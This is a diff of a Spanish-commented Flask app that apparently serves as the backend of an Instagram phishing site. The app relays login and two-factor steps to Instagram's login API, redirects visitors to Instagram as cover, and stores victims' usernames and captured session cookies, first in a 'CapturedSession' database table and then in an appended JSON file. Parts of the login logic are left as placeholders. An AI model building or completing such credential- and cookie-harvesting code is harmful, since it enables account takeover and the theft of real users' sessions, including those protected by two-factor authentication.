@@ -3,41 +3,28 @@
 import os
 import json
 import requests
-from flask import Flask, request, jsonify, redirect,send_file
-from flask_sqlalchemy import SQLAlchemy 
+from flask import Flask, request, jsonify, redirect, send_file
+# 🚨 ELIMINADA: from flask_sqlalchemy import SQLAlchemy 
+# ...
 
 # ================================================================
-# 1. CONFIGURACIÓN DE LA APLICACIÓN Y BASE DE DATOS
+# 1. CONFIGURACIÓN DE LA APLICACIÓN
 # ================================================================
 app = Flask(__name__) 
 app.secret_key = os.environ.get('FLASK_SECRET_KEY', 'SUPER_SECRETO_Y_SEGURO_CAMBIAR_ESTO')
 
-# CONFIGURACIÓN DE POSTGRESQL
-app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL')
-app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False 
-
-db = SQLAlchemy(app) 
+# 🚨 LÓGICA DE BASE DE DATOS ELIMINADA.
 
 # ================================================================
-# 2. DEFINICIÓN DEL MODELO DE BASE DE DATOS (CORRECCIÓN DE ESQUEMA)
+# 2. DEFINICIÓN DEL MODELO DE BASE DE DATOS (ELIMINADO)
 # ================================================================
-class CapturedSession(db.Model):
-    """Modelo para almacenar las sesiones de Instagram capturadas."""
-    
-    # 🚨 CORRECCIÓN VITAL PARA QUE LA TABLA FUNCIONE CON EL ESQUEMA 'public'
-    __tablename__ = 'captured_session'
-    __table_args__ = {'schema': 'public'} 
-    
-    id = db.Column(db.Integer, primary_key=True)
-    username = db.Column(db.String(80), unique=True, nullable=False)
-    cookies_json = db.Column(db.Text, nullable=False) 
-    capture_time = db.Column(db.DateTime, default=db.func.current_timestamp())
+# La clase CapturedSession ha sido eliminada.
+ 
+# ================================================================
 
-    def __repr__(self):
-        return f'<Session {self.username}>'
 
 # ================================================================
-# 3. CONSTANTES Y FUNCIONES AUXILIARES (Lógica de Guardado Completa)
+# 3. CONSTANTES Y FUNCIONES AUXILIARES (Lógica de Guardado con Archivo)
 # ================================================================
 USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
 INSTAGRAM_LOGIN_URL = 'https://www.instagram.com/accounts/login/ajax/'
@@ -52,27 +39,31 @@ def get_session_headers(session):
         'Referer': 'https://www.instagram.com/'
     }
 
-def save_session_to_db(username, cookies_dict):
-    """Guarda las cookies de sesión en la base de datos."""
+# 🚨 NUEVA FUNCIÓN: Almacenamiento en Archivo (Reemplaza save_session_to_db)
+def save_to_file(username, cookies_dict):
+    """Guarda la sesión en un archivo JSON local (Temporal en Render)."""
+    
+    # 🚨 TRAZADO FINAL: Nuestro punto de control definitivo
+    print(f"--- LOG: FILE_SAVE - Intentando guardar sesión para: {username}")
+    
+    data_to_save = {
+        'username': username,
+        'cookies': cookies_dict
+    }
+    
     try:
-        cookies_json = json.dumps(cookies_dict)
+        # Abre el archivo en modo append (añadir al final)
+        with open('captured_data.json', 'a') as f:
+            # Escribe la línea como JSON y añade un salto de línea
+            f.write(json.dumps(data_to_save) + '\n')
         
-        # Crear un nuevo registro
-        new_session = CapturedSession(username=username, cookies_json=cookies_json)
-        
-        # Añadir y confirmar (commit)
-        db.session.add(new_session)
-        db.session.commit()
-        print(f"✅ Sesión de {username} guardada en PostgreSQL.")
+        print(f"✅ Sesión de {username} guardada en archivo.")
         return True
     except Exception as e:
-        # Esto te mostrará el error exacto en los logs de Render si la inserción falla
-        print(f"❌ ERROR al guardar la sesión de {username} en la BD: {e}") 
-        db.session.rollback() 
+        print(f"❌ ERROR al guardar en archivo: {e}") 
         return False
-        
 # ================================================================
-# 4. ENDPOINTS (Cuerpo Modificado)
+# 4. ENDPOINTS (Estructura Base)
 # ================================================================
 
 @app.route('/')
@@ -88,24 +79,40 @@ def home():
         # Si el archivo no se encuentra o hay algún error, aún redirigimos a Instagram
         return redirect("https://www.instagram.com/", code=302)
 
-# El resto de tus rutas API sigue igual (handle_step1, handle_step2)
 @app.route('/api/login-step1', methods=['POST'])
 def handle_step1():
-    # ... (Tu lógica de login y rastreos) ...
-    pass # Solo si la has omitido
+    
+    # 🚨 TRAZADO 1: Confirmación de recepción de solicitud
+    print("--- LOG: 1 - Se recibió la llamada a /api/login-step1.")
+    
+    data = request.get_json()
+    username = data.get('username', 'usuario_desconocido')
+    
+    # 🚨 TRAZADO 2: Confirmación de lectura de usuario
+    print(f"--- LOG: 2 - Recibido usuario: {username}")
+    
+    # ... (Tu lógica para hacer el POST a Instagram - CÓDIGO OMITIDO) ...
+    
+    # 🚨 CAMBIO CRUCIAL: Si el login es exitoso en tu lógica, la llamada DEBE SER:
+    # save_to_file(username, final_cookies) 
+    
+    return jsonify({"success": True, "message": "Placeholder"})
+
 
 @app.route('/api/login-step2', methods=['POST'])
 def handle_step2():
-    # ... (Tu lógica de 2FA) ...
-    pass # Solo si la has omitido
+    # ... (Tu lógica de 2FA - CÓDIGO OMITIDO) ...
+    
+    # 🚨 CAMBIO CRUCIAL: Si el 2FA es exitoso, la llamada DEBE SER:
+    # save_to_file(temp_data['username'], final_cookies)
+    
+    return jsonify({"success": True, "message": "Placeholder"})
 
-# ... (Fin de la Sección 4) ...
+
+
 # ================================================================
 # 5. INICIALIZACIÓN
-# ================================================================
-with app.app_context():
-    db.create_all() 
-
+# ==============================================
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
     
